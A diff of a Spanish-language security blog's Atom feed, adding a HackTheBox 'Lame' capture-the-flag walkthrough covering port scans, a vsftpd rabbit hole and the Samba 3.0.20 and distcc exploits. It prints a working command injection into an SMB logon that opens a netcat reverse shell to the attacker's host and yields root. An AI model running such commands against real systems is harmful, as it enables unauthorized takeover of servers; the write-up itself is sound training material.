@@ -1,4 +1,448 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-07-29T17:52:36-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">osping</title><link href="http://localhost:4000/osping/" rel="alternate" type="text/html" title="osping" /><published>2022-07-20T00:00:00-05:00</published><updated>2022-07-20T00:00:00-05:00</updated><id>http://localhost:4000/osping</id><content type="html" xml:base="http://localhost:4000/osping/">&lt;p align=&quot;center&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-08-03T00:20:39-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">HTB Lame</title><link href="http://localhost:4000/lame/" rel="alternate" type="text/html" title="HTB Lame" /><published>2022-08-03T00:00:00-05:00</published><updated>2022-08-03T00:00:00-05:00</updated><id>http://localhost:4000/lame</id><content type="html" xml:base="http://localhost:4000/lame/">&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/lame/02-tarjeta.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;¡Hola!
+En esta ocasión vamos a resolver de la maquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Lame&lt;/code&gt; de &lt;a href=&quot;https://hackthebox.com/&quot;&gt;HackTheBox&lt;/a&gt;.
+La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!&lt;/p&gt;
+
+&lt;h2 id=&quot;preparación&quot;&gt;PREPARACIÓN&lt;/h2&gt;
+
+&lt;p&gt;Para iniciar nuestra máquina, vamos a crear con nuestra función &lt;a href=&quot;https://bast1ant1c.github.io/mkhack/&quot;&gt;mkhack&lt;/a&gt; un directorio de trabajo con el nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lame&lt;/code&gt; y los subdirectorios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; junto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;, con el objetivo de organizar la información que recopilemos en la realización de la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ mkhack lame
+❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;recon
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;reconocimiento&quot;&gt;RECONOCIMIENTO&lt;/h2&gt;
+
+&lt;p&gt;Accedemos al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad &lt;a href=&quot;https://bast1ant1c.github.io/osping/&quot;&gt;osping&lt;/a&gt; detectando el tipo de sistema operativo basado en el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ttl&lt;/code&gt; &lt;em&gt;time to live&lt;/em&gt; de una traza &lt;strong&gt;ICMP&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ osping 10.10.10.3
+  
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Detectando sistema operativo ...
+  
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.3 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; Linux
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Identificamos que es una maquina &lt;strong&gt;Linux&lt;/strong&gt; debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;TTL =&amp;gt; 64	Linux&lt;/li&gt;
+  &lt;li&gt;TTL =&amp;gt; 128	Windows&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Continuamos con la enumeración de los &lt;strong&gt;65535&lt;/strong&gt; puertos en la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.3 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; ports | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;open
+  21/tcp   open  ftp
+  22/tcp   open  ssh
+  139/tcp  open  netbios-ssn
+  445/tcp  open  microsoft-ds
+  3632/tcp open  distccd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Luego de identificar los puertos abiertos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OPEN&lt;/code&gt;, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ nmap &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,22,139,445,3632 &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.3 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; versions
+  PORT     STATE SERVICE     VERSION
+  21/tcp   open  ftp         vsftpd 2.3.4
+  | ftp-syst: 
+  |   STAT: 
+  | FTP server status:
+  |      Connected to 10.10.14.6
+  |      Logged &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;as ftp
+  |      TYPE: ASCII
+  |      No session bandwidth limit
+  |      Session &lt;span class=&quot;nb&quot;&gt;timeout &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;seconds is 300
+  |      Control connection is plain text
+  |      Data connections will be plain text
+  |      vsFTPd 2.3.4 - secure, fast, stable
+  |_End of status
+  |_ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  | ssh-hostkey:
+  |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  3632/tcp open  distccd     distccd v1 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;GNU&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 4.2.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu 4.2.4-1ubuntu4&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+  Service Info: OSs: Unix, Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+  
+  Host script results:
+  | smb-security-mode:
+  |   account_used: guest
+  |   authentication_level: user
+  |   challenge_response: supported
+  |_  message_signing: disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  |_smb2-time: Protocol negotiation failed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMB2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  | smb-os-discovery:
+  |   OS: Unix &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba 3.0.20-Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  |   Computer name: lame
+  |   NetBIOS computer name:
+  |   Domain name: hackthebox.gr
+  |   FQDN: lame.hackthebox.gr
+  |_  System &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2022-07-11T23:33:07-04:00
+  |_clock-skew: mean: 2h00m39s, deviation: 2h49m46s, median: 36s
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;reconocimiento-ftp&quot;&gt;RECONOCIMIENTO FTP&lt;/h2&gt;
+
+&lt;p&gt;Iniciamos con el reconocimiento del puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;21&lt;/code&gt; donde podemos acceder con el usuario y contraseña “anonymous”, obteniendo disponibilidad de los servicios, sin embargo, no es posible acceder a la información de la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ ftp 10.10.10.3
+  Connected to 10.10.10.3.
+  220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 2.3.4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.3:bast1ant1c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
+  331 Please specify the password.
+  Password:
+  230 Login sucessful.
+  Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
+  Using binary mode to transfer files.
+  ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
+  &lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
+  150 Here comes the directory listing.
+  226 Directory send OK.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vamos a verificar si la versión de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vsftpd&lt;/code&gt; es vulnerable por medio de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ❯ searchsploit vsftpd 2.3.4
+  &lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+   Exploit Title                                            |  Path
+  &lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+  vsftpd 2.3.4 - Backdoor Command Execution                 | unix/remote/49757.py
+  vsftpd 2.3.4 - Backdoor Command Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Metasploit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;    | unix/remote/17491.rb
+  &lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Luego de revisar el exploit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unix/remote/49757.py&lt;/code&gt;, detectamos que agregando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:)&lt;/code&gt; en el usuario al momento de acceder, en caso de ser exitoso generamos un acceso a la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ ftp 10.10.10.3
+  Connected to 10.10.10.3.
+  220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 2.3.4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.3:bast1ant1c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: hi:&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  331 Please specify the password.
+  Password:
+  &lt;span class=&quot;nb&quot;&gt;whoami
+  &lt;/span&gt;RABBIT HOLE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En esta ocasión nos encontramos con un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Rabbit Hole&lt;/code&gt; un servicio que aparenta ser explotable pero no lo es, por lo que tenemos que seguir revisando los otros puertos y servicios encontrados.&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeracion-smb&quot;&gt;ENUMERACION SMB&lt;/h2&gt;
+
+&lt;p&gt;Continuamos con la enumeración del servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;samba&lt;/code&gt;, vamos a listar los recursos compartidos en caso de ser posible para tener un potencial acceso.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; //10.10.10.3/ &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--option&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'client min protocol=NT1'&lt;/span&gt;
+  Anonymous login successful
+  
+          Sharename       Type      Comment
+          &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
+          print&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;         Disk      Printer Drivers
+          tmp             Disk      oh noes!
+          opt             Disk
+          IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;           IPC       IPC Service &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lame server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba 3.0.20-Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+          ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;         IPC       IPC Service &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lame server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba 3.0.20-Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+  Reconnecting with SMB1 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;workgroup listing.
+  Anonymous login successful
+  
+          Server               Comment
+          &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;            &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
+  
+          Workgroup            Master
+          &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;            &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
+          WORKGROUP            LAME
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vamos a verificar si la versión de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vsftpd&lt;/code&gt; es vulnerable por medio de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ searchsploit samba 3.0.20
+  &lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+   Exploit Title                                                                                             |  Path
+  &lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+  Samba 3.0.10 &amp;lt; 3.3.5 - Format String / Security Bypass                                                     | multiple/remote/10095.txt
+  Samba 3.0.20 &amp;lt; 3.0.25rc3 - &lt;span class=&quot;s1&quot;&gt;'Username'&lt;/span&gt; map script&lt;span class=&quot;s1&quot;&gt;' Command Execution (Metasploit)                           | unix/remote/16320.rb
+  Samba &amp;lt; 3.0.20 - Remote Heap Overflow                                                                      | linux/remote/7701.txt
+  Samba &amp;lt; 3.0.20 - Remote Heap Overflow                                                                      | linux/remote/7701.txt
+  Samba &amp;lt; 3.6.2 (x86) - Denial of Service (PoC)                                                              | linux_x86/dos/36741.py
+  -------------------------------------------------------------------------------------------------  ------- -----------------------------
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Luego de revisar el exploit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unix/remote/16320.rb&lt;/code&gt;, detectamos una vía potencial que permite ejecución remota de comandos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RCE&lt;/code&gt; &lt;em&gt;remote command execution&lt;/em&gt; al momento de acceder, en caso de ser exitoso generamos un acceso a la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ smbclient //10.10.10.3/tmp &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--option&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'client min protocol=NT1'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'logon &quot;/=`nohup nc -e /bin/bash 10.10.14.6 4564`&quot;'&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;nohup&lt;/span&gt;: se descarta la entrada y se redirige la salida de error a la salida estándar
+  Anonymous login successful
+  Password:
+  session setup failed: NT_STATUS_IO_TIMEOUT
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Generamos un listener por el puerto escogido y obtenemos acceso al sistema como usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4564
+  listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4564 ...
+  connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.6] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.3] 46709
+  &lt;span class=&quot;nb&quot;&gt;whoami
+  &lt;/span&gt;root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/lame/03-intrusion.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeracion-distccd&quot;&gt;ENUMERACION DISTCCD&lt;/h2&gt;
+
+&lt;p&gt;Vamos a realizar la búsqueda de posibles vulnerabilidades en el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;distcc&lt;/code&gt;, investigando un poco, existe un script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;distcc-cve2004-2687&lt;/code&gt; de nmap que identifica si la versión de distcc es o no vulnerable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ locate .nse | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;dist
+  /usr/share/nmap/scripts/distcc-cve2004-2687.nse
+  
+  ❯ nmap &lt;span class=&quot;nt&quot;&gt;-p3632&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.3 &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;distcc-cve2004-2687
+  PORT     STATE SERVICE
+  3632/tcp open  distccd
+  | distcc-cve2004-2687:
+  |   VULNERABLE:
+  |   distcc Daemon Command Execution
+  |     State: VULNERABLE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Exploitable&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  |     IDs:  CVE:CVE-2004-2687
+  |     Risk &lt;span class=&quot;nb&quot;&gt;factor&lt;/span&gt;: High  CVSSv2: 9.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;HIGH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;AV:N/AC:M/Au:N/C:C/I:C/A:C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  |       Allows executing of arbitrary commands on systems running distccd 3.1 and
+  |       earlier. The vulnerability is the consequence of weak service configuration.
+  |                                                                                                               
+  |     Disclosure &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2002-02-01                                                                               
+  |     Extra information:                                                                                        
+  |                                                                                                               
+  |     &lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                              
+  |                                                                                                               
+  |     References:                                                                                               
+  |       https://nvd.nist.gov/vuln/detail/CVE-2004-2687                                                          
+  |       https://distcc.github.io/security.html                                                                  
+  |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CVE-2004-2687                                            
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Detectamos que el servicio es vulnerable al CVE-2004-2687, así que vamos a hacer uso del exploit &lt;a href=&quot;https://github.com/k4miyo/CVE-2004-2687&quot;&gt;CVE-2004-2687&lt;/a&gt; del repositorio de github de &lt;a href=&quot;https://github.com/k4miyo/&quot;&gt;k4miyo&lt;/a&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../exploit
+❯ git clone https://github.com/k4miyo/CVE-2004-2687
+  Clonando en &lt;span class=&quot;s1&quot;&gt;'CVE-2004-2687'&lt;/span&gt;...
+  remote: Enumerating objects: 9, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+  remote: Counting objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9/9&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+  remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7/7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+  remote: Total 9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, pack-reused 0
+  Recibiendo objetos: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9/9&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, listo.
+❯ &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;CVE-2004-2687/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Payload: Payload generated!
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Execution: DistCC Daemon exploited with success!
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Opening connection to 10.10.10.3 on port 3632: Done
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;q] Trying to &lt;span class=&quot;nb&quot;&gt;bind &lt;/span&gt;to :: on port 4564: Trying ::
+Traceback &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;most recent call last&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+  File &lt;span class=&quot;s2&quot;&gt;&quot;/home/bast1ant1c/Desktop/bast1ant1c/HTB/lame/exploit/CVE-2004-2687/CVE-2004-2687.py&quot;&lt;/span&gt;, line 120, &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &amp;lt;modu  le&amp;gt;
+    shell &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; listen&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lport, &lt;span class=&quot;nb&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.wait_for_connection&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+  File &lt;span class=&quot;s2&quot;&gt;&quot;/home/bast1ant1c/.local/lib/python3.9/site-packages/pwnlib/tubes/listen.py&quot;&lt;/span&gt;, line 105, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;__init__
+    listen_sock.bind&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;self.sockaddr&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+OSError: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Errno 98] Address already &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;use
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Closed connection to 10.10.10.3 port 3632
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
